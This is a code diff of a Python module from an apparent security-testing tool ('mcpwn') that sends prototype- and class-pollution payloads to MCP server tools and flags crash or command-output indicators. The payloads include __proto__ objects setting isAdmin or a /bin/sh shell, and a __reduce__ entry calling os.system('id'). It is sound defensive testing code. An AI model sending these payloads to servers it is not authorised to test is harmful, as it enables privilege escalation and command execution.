@@ -1,129 +1,146 @@
-"""Schema/prototype pollution attacks via MCP tools"""
+"""Schema and prototype pollution tests.
+
+Detection uses observable parser/type errors and RCE indicators from the same
+response.  It never consults global detector state and never treats reflection
+of ``__proto__`` as success.
+"""
+from __future__ import annotations
+
 import json
 import logging
 
+from core.evidence import make_finding
+from core.protocol import (
+    ProtocolError,
+    RequestTimeout,
+    SafetyLimitExceeded,
+    TransportError,
+    content_summary,
+    result_text,
+)
+
+logger = logging.getLogger("mcpwn.schema_pollution")
+
+CRASH_INDICATORS = (
+    "Maximum call stack size exceeded",
+    "Cannot convert object to primitive value",
+    "TypeError: Cannot read propert",
+    "this.toString is not a function",
+    "Recursive process.env",
+    "RangeError: Maximum call stack",
+)
+
 
 class SchemaPollutionTest:
-    """Test for prototype/schema pollution vulnerabilities"""
+    """Test prototype/schema pollution behaviour."""
 
-    def __init__(self, pentester):
-        self.pentester = pentester
-
-    # JavaScript prototype pollution (DoS-focused for reliable detection)
     PROTO_PAYLOADS = [
-        {"__proto__": {"toString": "polluted"}},  # Triggers TypeError on string coercion
-        {"__proto__": {"valueOf": "polluted"}},   # Triggers TypeError on value coercion
+        {"__proto__": {"toString": "polluted"}},
+        {"__proto__": {"valueOf": "polluted"}},
         {"constructor": {"prototype": {"isAdmin": True}}},
         {"__proto__": {"shell": "/bin/sh", "env": {"PATH": "/tmp"}}},
     ]
-
-    # Python class pollution (Note: __reduce__ only works with pickle/yaml, not JSON)
     PYTHON_PAYLOADS = [
         {"__class__": {"__init__": {"__globals__": {"admin": True}}}},
-        {"__reduce__": ["os.system", ["id"]]},  # Pickle/YAML only
+        {"__reduce__": ["os.system", ["id"]]},
         {"__dict__": {"_admin": True}},
         {"__builtins__": {"__import__": "os"}},
     ]
-
-    # Generic injection into nested structures
     NESTED_PAYLOADS = [
         {"a": {"b": {"c": {"__proto__": {"x": 1}}}}},
         {"config": {"__proto__": {"debug": True}}},
         {"settings": {"constructor": {"prototype": {"shell": True}}}},
     ]
 
+    def __init__(self, pentester):
+        self.pentester = pentester
+
     def run(self, tool):
-        """Test for schema pollution vulnerabilities"""
-        self.pentester.health_check()
         findings = []
-        schema = tool.get('inputSchema', {})
-
-        # Find object-type arguments
-        for arg, spec in schema.get('properties', {}).items():
-            if spec.get('type') in ['object', None]:  # None = any type
+        schema = tool.get("inputSchema", {}) or {}
+        properties = schema.get("properties", {}) or {}
+        for arg, spec in properties.items():
+            if not isinstance(spec, dict):
+                continue
+            if spec.get("type") in ("object", None):
                 findings.extend(self._test_pollution(tool, arg))
-
-        # Also test with entire arguments as pollution payload
         findings.extend(self._test_root_pollution(tool))
-
         return findings
 
     def _test_pollution(self, tool, arg):
         findings = []
-        all_payloads = self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS + self.NESTED_PAYLOADS
-
-        for payload in all_payloads:
+        payloads = (self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS +
+                    self.NESTED_PAYLOADS)
+        limit = self.pentester.policy.payload_limit()
+        for payload in payloads[:limit]:
             try:
-                params = {"name": tool['name'], "arguments": {arg: payload}}
-                resp, _ = self.pentester.send("tools/call", params)
-
-                # Check for pollution indicators
-                content = str(resp)
-                if self._detect_pollution(content, payload):
-                    findings.append({
-                        'type': 'SCHEMA_POLLUTION',
-                        'tool': tool['name'],
-                        'arg': arg,
-                        'payload': json.dumps(payload),
-                        'severity': 'HIGH',
-                        'note': 'Potential prototype/schema pollution detected'
-                    })
-            except (RuntimeError, IOError, OSError, KeyError, ValueError,
-                    TypeError, AttributeError, TimeoutError) as e:
-                logging.debug("Schema pollution test error for %s.%s: %s",
-                              tool['name'], arg, e)
-
+                response, _ = self.pentester.send(
+                    "tools/call",
+                    {"name": tool.get("name"), "arguments": {arg: payload}},
+                    skip_analysis=True,
+                )
+            except (TransportError, ProtocolError, RequestTimeout,
+                    SafetyLimitExceeded) as exc:
+                logger.debug("schema probe failed: %s", exc)
+                continue
+            finding = self._finding(tool, payload, response, arg)
+            if finding:
+                findings.append(finding)
+                break
         return findings
 
     def _test_root_pollution(self, tool):
-        """Test pollution at root arguments level"""
         findings = []
-        all_payloads = self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS
-
-        for payload in all_payloads:
+        limit = self.pentester.policy.payload_limit()
+        for payload in (self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS)[:limit]:
             try:
-                params = {"name": tool['name'], "arguments": payload}
-                resp, _ = self.pentester.send("tools/call", params)
-
-                content = str(resp)
-                if self._detect_pollution(content, payload):
-                    findings.append({
-                        'type': 'ROOT_POLLUTION',
-                        'tool': tool['name'],
-                        'payload': json.dumps(payload),
-                        'severity': 'CRITICAL',
-                        'note': 'Root-level pollution successful'
-                    })
-            except (RuntimeError, IOError, OSError, KeyError, ValueError,
-                    TypeError, AttributeError, TimeoutError) as e:
-                logging.debug("Root pollution test error for %s: %s",
-                              tool['name'], e)
-
+                response, _ = self.pentester.send(
+                    "tools/call",
+                    {"name": tool.get("name"), "arguments": payload},
+                    skip_analysis=True,
+                )
+            except (TransportError, ProtocolError, RequestTimeout,
+                    SafetyLimitExceeded) as exc:
+                logger.debug("root pollution probe failed: %s", exc)
+                continue
+            finding = self._finding(tool, payload, response, None)
+            if finding:
+                finding["type"] = "ROOT_POLLUTION"
+                finding["severity"] = "HIGH"
+                findings.append(finding)
+                break
         return findings
 
-    def _detect_pollution(self, content, payload):
-        """Detect pollution via behavioral indicators, not reflection"""
-        # 1. Check if semantic detector found RCE/file read
-        if self.pentester.detector.findings:
-            return True
-
-        # 2. Check for RCE command output (uid= from 'id' command)
-        if "uid=" in content and "gid=" in content:
-            return True
-
-        # 3. Check for DoS/crash indicators (toString/valueOf pollution)
-        crash_indicators = [
-            "Maximum call stack size exceeded",
-            "Cannot convert object to primitive value",
-            "TypeError: Cannot read property",
-            "TypeError: this.toString is not a function",
-            "Recursive process.env",
-            "RangeError: Maximum call stack",
-        ]
-        if any(indicator in content for indicator in crash_indicators):
-            return True
-
-        # 4. REMOVED: Reflection checks (high false positive rate)
-        # Do NOT flag just because the server echoes back invalid input
-
-        return False
+    def _finding(self, tool, payload, response, arg):
+        text = result_text(response)
+        rce = self.pentester.scan_response(response)
+        if rce:
+            return make_finding(
+                "SCHEMA_POLLUTION",
+                tool=tool.get("name"),
+                arg=arg,
+                payload=json.dumps(payload),
+                severity="HIGH",
+                confidence=65,
+                evidence=[
+                    "indicator: {}".format(rce[0].get("indicator", "")),
+                    content_summary(response, 300),
+                ],
+                note="pollution payload produced an execution indicator",
+            )
+        crashes = [marker for marker in CRASH_INDICATORS if marker in text]
+        if crashes:
+            return make_finding(
+                "SCHEMA_POLLUTION",
+                tool=tool.get("name"),
+                arg=arg,
+                payload=json.dumps(payload),
+                severity="MEDIUM",
+                confidence=45,
+                evidence=[
+                    "parser/type error: {}".format(crashes[0]),
+                    content_summary(response, 300),
+                ],
+                note="type-coercion error; impact unverified",
+            )
+        return None
